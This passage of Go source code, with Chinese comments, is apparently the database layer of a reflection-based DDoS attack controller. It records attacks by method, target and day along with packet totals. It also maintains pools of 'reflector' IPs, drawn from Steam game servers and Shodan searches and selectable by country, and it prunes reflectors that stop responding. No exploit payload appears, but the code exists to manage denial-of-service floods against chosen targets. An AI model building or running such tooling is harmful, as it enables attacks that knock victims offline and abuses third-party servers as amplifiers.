			var b LogStatsBucket
			rows.Scan(&b.Key, &b.Count, &b.Packets)
			s.ByMethod = append(s.ByMethod, b)
		}
	}

	rows, err = d.Query(`
		SELECT target, COUNT(*), COALESCE(SUM(total_packets), 0)
		FROM attack_logs WHERE start_time >= ? GROUP BY target ORDER BY COUNT(*) DESC LIMIT 10
	`, since)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var b LogStatsBucket
			rows.Scan(&b.Key, &b.Count, &b.Packets)
			s.ByTarget = append(s.ByTarget, b)
		}
	}

	rows, err = d.Query(`
		SELECT date(start_time, 'unixepoch', 'localtime') AS day, COUNT(*), COALESCE(SUM(total_packets), 0)
		FROM attack_logs WHERE start_time >= ? GROUP BY day ORDER BY day
	`, since)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var b LogStatsDay
			rows.Scan(&b.Day, &b.Count, &b.Packets)
			s.Daily = append(s.Daily, b)
		}
	}
	return s
}

func CleanupDB() (int, int) {
	d := getDB()
	staleSteam, staleErr := d.Exec(`
		DELETE FROM reflectors WHERE source = 'steam' AND last_seen_at > 0 AND last_seen_at < strftime('%s','now') - 604800
	`)
	deadManual, manualErr := d.Exec(`
		DELETE FROM reflectors WHERE source = 'manual' AND (
			(fail_count > 5 AND success_count = 0) OR
			(fail_count > 10)
		)
	`)
	// Exec 失败时 Result 为 nil，直接调 RowsAffected 会空指针 panic
	ns, nm := 0, 0
	if staleErr == nil && staleSteam != nil {
		n64, _ := staleSteam.RowsAffected()
		ns = int(n64)
	}
	if manualErr == nil && deadManual != nil {
		n64, _ := deadManual.RowsAffected()
		nm = int(n64)
	}

	d.Exec("DELETE FROM attack_logs WHERE start_time < strftime('%s','now') - 2592000")
	d.Exec("PRAGMA optimize")
	log.Printf("[db] cleanup: removed %d stale steam, %d dead manual entries, vacuumed", ns, nm)
	return int(ns), int(nm)
}

// AddCandidate 添加候选反射器到候选池
func AddCandidate(c Candidate) error {
	d := getDB()
	now := time.Now().Unix()
	if c.AddedAt == 0 {
		c.AddedAt = now
	}
	_, err := d.Exec(`
		INSERT INTO reflector_candidates (ip, port, game, country, continent, source, added_at, last_verified)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(ip, port, game) DO UPDATE SET
			country = excluded.country,
			continent = excluded.continent,
			source = excluded.source,
			added_at = excluded.added_at
	`, c.IP, c.Port, c.Game, c.Country, c.Continent, c.Source, c.AddedAt, 0)
	return err
}

// GetCandidates 获取候选池（支持按地理位置筛选）
func GetCandidates(game, country string, limit int) ([]Candidate, error) {
	d := getDB()
	var rows *sql.Rows
	var err error

	if country != "" {
		rows, err = d.Query(`
			SELECT ip, port, game, country, continent, source, added_at
			FROM reflector_candidates
			WHERE game = ? AND country = ?
			ORDER BY added_at DESC
			LIMIT ?
		`, game, country, limit)
	} else {
		rows, err = d.Query(`
			SELECT ip, port, game, country, continent, source, added_at
			FROM reflector_candidates
			WHERE game = ?
			ORDER BY added_at DESC
			LIMIT ?
		`, game, limit)
	}

	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var candidates []Candidate
	for rows.Next() {
		var c Candidate
		if err := rows.Scan(&c.IP, &c.Port, &c.Game, &c.Country, &c.Continent, &c.Source, &c.AddedAt); err != nil {
			continue
		}
		candidates = append(candidates, c)
	}
	return candidates, nil
}

// LogShodanSync 记录Shodan同步任务
func LogShodanSync(taskID string, countries []string) (int64, error) {
	d := getDB()
	now := time.Now().Unix()
	countriesJSON, _ := json.Marshal(countries)
	result, err := d.Exec(`
		INSERT INTO shodan_sync_log (started_at, countries, status)
		VALUES (?, ?, 'running')
	`, now, string(countriesJSON))
	if err != nil {
		return 0, err
	}
	return result.LastInsertId()
}

// UpdateShodanSync 更新Shodan同步任务状态
func UpdateShodanSync(id int64, totalFetched, totalAdded int, status string) error {
	d := getDB()
	now := time.Now().Unix()
	_, err := d.Exec(`
		UPDATE shodan_sync_log
		SET finished_at = ?, total_fetched = ?, total_added = ?, status = ?
		WHERE id = ?
	`, now, totalFetched, totalAdded, status, id)
	return err
}

// MarkStaleRunningLogs 在 Controller 启动时标记所有 running 状态的攻击日志为 failed
func MarkStaleRunningLogs() {
	d := getDB()
	if d == nil {
		return
	}
	res, err := d.Exec(`UPDATE attack_logs SET status='failed', end_time=? WHERE status='running'`, time.Now().Unix())
	// Exec 失败时 Result 为 nil，直接调 RowsAffected 会空指针 panic（启动路径崩溃）
	if err != nil || res == nil {
		log.Printf("[db] mark stale running logs failed: %v", err)
		return
	}
	rows, _ := res.RowsAffected()
	if rows > 0 {
		log.Printf("[db] marked %d stale running logs as failed on startup", rows)
	}
}
